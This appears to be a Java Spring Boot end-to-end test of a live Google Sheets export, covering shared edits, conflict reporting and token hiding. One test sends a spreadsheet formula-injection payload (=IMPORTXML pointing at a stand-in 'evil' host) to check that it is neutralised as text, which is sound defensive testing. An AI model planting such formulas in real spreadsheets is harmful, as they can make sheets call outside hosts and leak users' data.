package com.example.ntbd.livedata;

import com.example.ntbd.auth.TestSignIn;
import com.example.ntbd.commands.LiveDataSourceCommand;
import com.example.ntbd.service.DataSourceService;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayNameGeneration;
import org.junit.jupiter.api.DisplayNameGenerator;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.MediaType;
import org.springframework.test.context.DynamicPropertyRegistry;
import org.springframework.test.context.DynamicPropertySource;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.authentication;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;

/**
 * The phase's first exit criterion, end to end against a stand-in for Google Sheets: an app on a Google Sheet,
 * exported live; two browsers (different origins, the export opened from disk) use it through the data API with
 * the export's key, and each sees the other's changes on its next read. A change made on stale data wins, and
 * the browser is told what it overwrote.
 */
@SpringBootTest
@AutoConfigureMockMvc
@DisplayNameGeneration(DisplayNameGenerator.ReplaceUnderscores.class)
class LiveSheetsEndToEndTest {

    private static final long BRANCH = -1L;
    private static final FakeGoogleSheets SHEETS;

    static {
        try {
            SHEETS = new FakeGoogleSheets("Orders", List.of(List.of("customer", "amount"), List.of("Ada", "750")));
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    @DynamicPropertySource
    static void sheetsApi(DynamicPropertyRegistry registry) {
        registry.add("app.data.google.sheets-api", SHEETS::url);
    }

    @AfterAll
    static void stopSheets() {
        SHEETS.close();
    }

    @Autowired private MockMvc mockMvc;
    @Autowired private ObjectMapper objectMapper;
    @Autowired private ConnectionService connections;
    @Autowired private DataSourceService dataSources;
    @Autowired private com.example.ntbd.persistence.DataSourceRepository dataSourceRepository;
    @Autowired private com.example.ntbd.persistence.DataConnectionRepository connectionRepository;
    @Autowired private com.example.ntbd.persistence.ApplicationRepository applicationRepository;
    @Autowired private org.springframework.transaction.support.TransactionTemplate transactions;

    private long orders;
    private long connection;

    @BeforeEach
    void connectTheSheet() {
        SHEETS.reset(List.of(List.of("customer", "amount"), List.of("Ada", "750")));
        TestSignIn.signInAs(-1L);
        Long workspace = connections.workspaceOf(null, BRANCH);
        connection = connections.createSignedIn(workspace, "Google Sheets", "gsheets",
                Map.of("account", "owner@example.com"), Map.of("accessToken", FakeGoogleSheets.TOKEN)).id();
        orders = dataSources.createLive(new LiveDataSourceCommand(BRANCH, "orders", connection,
                Map.of("spreadsheet", "https://docs.google.com/spreadsheets/d/" + FakeGoogleSheets.SPREADSHEET + "/edit", "sheet", "Orders"),
                null, false)).id();
    }

    /** The sample app is shared with other tests: take the live source away again, and the export choice. */
    @AfterEach
    void cleanUp() {
        transactions.executeWithoutResult(status -> {
            dataSourceRepository.deleteById(new com.example.ntbd.domain.DataSource.DataSourceId(orders));
            connectionRepository.deleteById(connection);
            applicationRepository.findById(new com.example.ntbd.domain.Application.ApplicationId(-1L))
                    .ifPresent(app -> app.setExportDataMode("embed"));
        });
        TestSignIn.signOut();
    }

    @Test
    void two_browsers_edit_the_same_sheet_through_one_live_export() throws Exception {
        // The sheet got the connector's own row ids, so rows are found by id, not position
        assertThat(SHEETS.rows().getFirst()).containsExactly("customer", "amount", "_id");
        assertThat(SHEETS.rows().get(1).get(2)).isNotBlank();

        String html = export("live");
        String key = keyIn(html);
        assertThat(html).doesNotContain(FakeGoogleSheets.TOKEN);

        // Browser A adds a row
        JsonNode added = json(mockMvc.perform(post("/api/data/" + orders + "/rows").header("Authorization", "Bearer " + key)
                        .header("Origin", "null").contentType(MediaType.APPLICATION_JSON)
                        .content("{\"values\":{\"customer\":\"Bob\",\"amount\":\"20\"}}"))
                .andReturn(), 201);
        String bob = added.get("id").asString();

        // Browser B (another origin) reads it
        JsonNode seenByB = rows(key, "https://intranet.example.com");
        assertThat(customers(seenByB)).containsExactly("Ada", "Bob");

        // B changes Bob's amount (based on 20): no conflict
        JsonNode byB = change(key, bob, "{\"amount\":\"25\"}", "{\"amount\":\"20\"}");
        assertThat(byB.get("conflicts").size()).isZero();

        // A, still on its old copy (20), changes it too: A wins, and hears it overwrote B's 25
        JsonNode byA = change(key, bob, "{\"amount\":\"30\"}", "{\"amount\":\"20\"}");
        assertThat(byA.get("conflicts").get("amount").asString()).isEqualTo("25");
        assertThat(amountOf(rows(key, "https://intranet.example.com"), "Bob")).isEqualTo("30");

        // Someone types into the sheet directly: the app sees it on its next read
        SHEETS.grid.add(new java.util.ArrayList<>(List.of("Cleo", "5")));
        assertThat(customers(rows(key, "null"))).containsExactly("Ada", "Bob", "Cleo");

        // A deletes Bob; B no longer sees him
        mockMvc.perform(post("/api/data/" + orders + "/rows/delete").header("Authorization", "Bearer " + key)
                        .contentType(MediaType.APPLICATION_JSON).content("{\"ids\":[\"" + bob + "\"]}"))
                .andExpect(r -> assertThat(r.getResponse().getStatus()).isEqualTo(204));
        assertThat(customers(rows(key, "https://intranet.example.com"))).containsExactly("Ada", "Cleo");
        assertThat(SHEETS.rows()).extracting(row -> row.getFirst()).containsExactly("customer", "Ada", "Cleo");
    }

    @Test
    void formulas_typed_into_the_app_arrive_as_text() throws Exception {
        String key = keyIn(export("live"));
        mockMvc.perform(post("/api/data/" + orders + "/rows").header("Authorization", "Bearer " + key)
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"values\":{\"customer\":\"=IMPORTXML(\\\"http://evil\\\",\\\"//a\\\")\",\"amount\":\"-5\"}}"));
        // The fake drops the leading apostrophe as Sheets does; the request carried it, so Sheets keeps it as text
        assertThat(SHEETS.requests).anyMatch(r -> r.contains(":append"));
        assertThat(FakeGoogleSheets.SENT).contains("'=IMPORTXML(\"http://evil\",\"//a\")").contains("-5");
        assertThat(customers(rows(key, "null"))).contains("=IMPORTXML(\"http://evil\",\"//a\")");
    }

    private String export(String dataMode) throws Exception {
        MvcResult result = mockMvc.perform(get("/api/branches/" + BRANCH + "/export").param("dataMode", dataMode)
                .with(authentication(TestSignIn.authentication(-1L)))).andReturn();
        assertThat(result.getResponse().getStatus()).isEqualTo(200);
        return result.getResponse().getContentAsString(StandardCharsets.UTF_8);
    }

    private static String keyIn(String html) {
        Matcher m = Pattern.compile("\"key\":\"(ntbd_ak_[A-Za-z0-9_-]+)\"").matcher(html);
        assertThat(m.find()).as("the live export carries its app key").isTrue();
        return m.group(1);
    }

    private JsonNode rows(String key, String origin) throws Exception {
        JsonNode page = json(mockMvc.perform(get("/api/data/" + orders).header("Authorization", "Bearer " + key)
                .header("Origin", origin)).andReturn(), 200);
        return page.get("rows");
    }

    private JsonNode change(String key, String id, String values, String base) throws Exception {
        return json(mockMvc.perform(patch("/api/data/" + orders + "/rows").header("Authorization", "Bearer " + key)
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"id\":\"" + id + "\",\"values\":" + values + ",\"base\":" + base + "}")).andReturn(), 200);
    }

    private JsonNode json(MvcResult result, int status) throws Exception {
        assertThat(result.getResponse().getStatus()).as(result.getResponse().getContentAsString()).isEqualTo(status);
        return objectMapper.readTree(result.getResponse().getContentAsString(StandardCharsets.UTF_8));
    }

    private static List<String> customers(JsonNode rows) {
        return java.util.stream.StreamSupport.stream(rows.spliterator(), false).map(r -> r.get("values").get(0).asString()).toList();
    }

    private static String amountOf(JsonNode rows, String customer) {
        return java.util.stream.StreamSupport.stream(rows.spliterator(), false)
                .filter(r -> r.get("values").get(0).asString().equals(customer))
                .map(r -> r.get("values").get(1).asString()).findFirst().orElseThrow();
    }
}
